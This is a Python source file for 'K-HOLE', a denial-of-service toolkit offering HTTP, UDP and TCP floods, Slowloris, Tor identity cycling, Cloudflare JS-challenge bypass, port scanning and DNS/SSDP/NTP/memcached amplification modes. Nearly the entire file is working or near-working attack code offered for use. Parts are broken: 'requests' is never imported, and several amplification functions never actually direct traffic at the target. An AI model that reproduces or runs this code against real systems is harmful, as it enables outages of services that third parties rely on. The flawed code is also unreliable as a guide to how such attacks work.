# =========================================================
#    _  _           _  _      ____      _         ____   
#   FJ / ;         FJ  L]    F __ ]    FJ        F ___J  
#  J |/ (| ______ J |__| L  J |--| L  J |       J |___:  
#  |     L|______||  __  |  | |  | |  | |       | _____| 
#  F L:\  L______JF L__J J  F L__J J  F L_____  F L____: 
# J__L \\__L     J__L  J__LJ\______/FJ________LJ________L
# |__L  \L_|     |__L  J__| J______F |________||________|
# =========================================================
# K-HOLE - KJI's DoS and Stress Testing Toolkit
# Coded by KetaGod | https://t.me/ketagod
# You are responsible for whatever you use this toolkit on. 
# Thank you for using K-HOLE.
# =========================================================
import argparse
import threading
import random
import string
import time
import socket
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from datetime import datetime
import os
import stem.process
from stem.control import Controller
import cloudscraper
import struct
import dns.resolver

init(autoreset=True)
ua = UserAgent()

ascii_logo = f"""
{Fore.MAGENTA}{Style.BRIGHT}
   _  _           _  _      ____      _         ____   
  FJ / ;         FJ  L]    F __ ]    FJ        F ___J  
 J |/ (| ______ J |__| L  J |--| L  J |       J |___:  
 |     L|______||  __  |  | |  | |  | |       | _____| 
 F L:\  L______JF L__J J  F L__J J  F L_____  F L____: 
J__L \\__L     J__L  J__LJ\______/FJ________LJ________L
|__L  \L_|     |__L  J__| J______F |________||________|
{Style.RESET_ALL}
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════╗
║            K-HOLE - KJI's DoS and Stress Testing Toolkit             ║
║               Coded by KetaGod | https://t.me/ketagod                ║
║  ➤ HTTP(S) & Async Flooding     ➤ TOR Identity Cycling               ║
║  ➤ UDP / TCP Flood              ➤ JS Challenge Bypass                ║
║  ➤ Slowloris                    ➤ DNS/NTP/SSDP Amplify               ║
║  ➤ Custom Payload Injection     ➤ Layer 4/7 Attacks                  ║
║  ➤ Real-Time Stats              ➤ Target Scanner                     ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

print(ascii_logo)

http_stats = {"success": 0, "fail": 0}
udp_stats = {"sent": 0, "errors": 0}
tcp_stats = {"sent": 0, "errors": 0}
sl_stats = {"open": 0, "fail": 0}
amplify_stats = {"packets": 0, "errors": 0}
running = True

def http_flood(target_url, method, duration, thread_count):
    timeout = time.time() + duration
    def attack():
        while time.time() < timeout:
            try:
                headers = {'User-Agent': ua.random}
                if method == "GET":
                    r = requests.get(target_url, headers=headers)
                else:
                    r = requests.post(target_url, headers=headers)
                http_stats['success'] += 1
            except:
                http_stats['fail'] += 1
    
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

async def async_http_flood(target_url, method, duration, rps, proxy_list):
    timeout = time.time() + duration
    tasks = []

    async def attack():
        while time.time() < timeout:
            try:
                proxy = random.choice(proxy_list) if proxy_list else None
                connector = ProxyConnector.from_url(f"http://{proxy}") if proxy else None
                async with aiohttp.ClientSession(connector=connector) as session:
                    headers = {'User-Agent': ua.random}
                    async with session.request(method, target_url, headers=headers) as resp:
                        http_stats['success'] += 1
            except:
                http_stats['fail'] += 1

    for _ in range(rps):
        tasks.append(attack())

    await asyncio.gather(*tasks)

def udp_flood(target_ip, port, duration, thread_count, payload=None):
    timeout = time.time() + duration
    message = payload.encode() if payload else random._urandom(1024)

    def flood():
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(message, (target_ip, port))
                udp_stats['sent'] += 1
            except:
                udp_stats['errors'] += 1

    for _ in range(thread_count):
        threading.Thread(target=flood).start()

def tcp_flood(target_ip, port, duration, thread_count, payload=None):
    timeout = time.time() + duration
    message = payload.encode() if payload else random._urandom(1024)

    def flood():
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                s.send(message)
                tcp_stats['sent'] += 1
            except:
                tcp_stats['errors'] += 1

    for _ in range(thread_count):
        threading.Thread(target=flood).start()

def slowloris_attack(target_ip, port, duration, sockets=100):
    timeout = time.time() + duration
    sock_list = []

    for _ in range(sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.send(b"GET /?" + bytes(str(random.randint(0,1000)), 'utf-8') + b" HTTP/1.1\r\n")
            s.send(b"User-Agent: " + bytes(ua.random, 'utf-8') + b"\r\n")
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            sock_list.append(s)
            sl_stats['open'] += 1
        except:
            sl_stats['fail'] += 1

    while time.time() < timeout:
        for s in sock_list:
            try:
                s.send(b"X-a: " + bytes(str(random.randint(1, 5000)), 'utf-8') + b"\r\n")
            except:
                sock_list.remove(s)

def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='mytorpassword')
        controller.signal('NEWNYM')

def bypass_js_challenge(target_url, duration):
    scraper = cloudscraper.create_scraper()
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            scraper.get(target_url)
            http_stats['success'] += 1
        except:
            http_stats['fail'] += 1

def scan_target(ip, port_range):
    open_ports = []
    for port in port_range:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            sock.connect((ip, port))
            open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

def dns_amplification(target_ip, duration, resolver_list):
    timeout = time.time() + duration
    def amplify():
        while time.time() < timeout:
            try:
                resolver_ip = random.choice(resolver_list)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                dns_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"\x06google\x03com\x00\x00\x01\x00\x01"
                sock.sendto(dns_request, (resolver_ip, 53))
                amplify_stats['packets'] += 1
            except:
                amplify_stats['errors'] += 1
    
    for _ in range(50):
        threading.Thread(target=amplify).start()

def ssdp_amplification(target_ip, duration):
    payload = "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nMan:\"ssdp:discover\"\r\nMX:3\r\nST:ssdp:all\r\n\r\n"
    ssdp_ips = ["239.255.255.250"]
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for ip in ssdp_ips:
                    sock.sendto(payload.encode(), (ip, 1900))
                    sock.sendto(payload.encode(), (target_ip, 1900))
                    amplify_stats['packets'] += 1
            except:
                amplify_stats['errors'] += 1

    for _ in range(50):
        threading.Thread(target=flood).start()

def ntp_amplification(target_ip, duration):
    ntp_servers = ["pool.ntp.org", "time.google.com"]
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                server = random.choice(ntp_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b'\x17\x00\x03\x2a' + 4 * b'\x00', (server, 123))
                amplify_stats['packets'] += 1
            except:
                amplify_stats['errors'] += 1

    for _ in range(50):
        threading.Thread(target=flood).start()

def memcached_amplification(target_ip, duration):
    timeout = time.time() + duration
    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", (target_ip, 11211))
                amplify_stats['packets'] += 1
            except:
                amplify_stats['errors'] += 1

    for _ in range(50):
        threading.Thread(target=flood).start()

def save_log(mode, target, duration):
    with open("log.txt", "a") as f:
        f.write(f"[{datetime.now()}] Mode: {mode} | Target: {target} | Duration: {duration}s\n")

def print_stats():
    print(f"HTTP: {http_stats['success']} success, {http_stats['fail']} fail")
    print(f"UDP: {udp_stats['sent']} sent, {udp_stats['errors']} errors")
    print(f"TCP: {tcp_stats['sent']} sent, {tcp_stats['errors']} errors")
    print(f"Slowloris: {sl_stats['open']} open, {sl_stats['fail']} failed")
    print(f"Amplified: {amplify_stats['packets']} packets, {amplify_stats['errors']} errors")

def main():
    parser = argparse.ArgumentParser(description="K-HOLE | Multi-Mode Tool")
    parser.add_argument("--mode", required=True, choices=["http", "async_http", "udp", "tcp", "slowloris", "scan", "bypass", "amplify"])
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--method", default="GET")
    parser.add_argument("--rps", type=int, default=100)
    parser.add_argument("--proxies")
    parser.add_argument("--log", action="store_true")
    parser.add_argument("--sockets", type=int, default=100)
    parser.add_argument("--scanrange")
    parser.add_argument("--torcycle", action="store_true")
    parser.add_argument("--payload")
    parser.add_argument("--resolvers")
    parser.add_argument("--amptype", choices=["dns", "ssdp", "ntp", "memcached"], default="dns")
    args = parser.parse_args()

    if args.torcycle:
        renew_tor_ip()

    proxy_list = []
    if args.proxies and os.path.exists(args.proxies):
        with open(args.proxies, "r") as f:
            proxy_list = [line.strip() for line in f if line.strip()]

    if args.mode == "http":
        http_flood(args.target, args.method, args.duration, args.threads)
    elif args.mode == "async_http":
        asyncio.run(async_http_flood(args.target, args.method, args.duration, args.rps, proxy_list))
    elif args.mode == "udp":
        udp_flood(args.target, args.port, args.duration, args.threads, args.payload)
    elif args.mode == "tcp":
        tcp_flood(args.target, args.port, args.duration, args.threads, args.payload)
    elif args.mode == "slowloris":
        slowloris_attack(args.target, args.port, args.duration, args.sockets)
    elif args.mode == "scan":
        if not args.scanrange:
            print("--scanrange is required for scan mode")
            return
        start, end = map(int, args.scanrange.split("-"))
        result = scan_target(args.target, range(start, end+1))
        print("Open Ports:", result)
    elif args.mode == "bypass":
        bypass_js_challenge(args.target, args.duration)
    elif args.mode == "amplify":
        if args.amptype == "dns":
            if not args.resolvers:
                print("--resolvers file is required for DNS amplification")
                return
            with open(args.resolvers, "r") as f:
                resolvers = [line.strip() for line in f if line.strip()]
            dns_amplification(args.target, args.duration, resolvers)
        elif args.amptype == "ssdp":
            ssdp_amplification(args.target, args.duration)
        elif args.amptype == "ntp":
            ntp_amplification(args.target, args.duration)
        elif args.amptype == "memcached":
            memcached_amplification(args.target, args.duration)

    print_stats()
    if args.log:
        save_log(args.mode, args.target, args.duration)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[!] Aborted.")
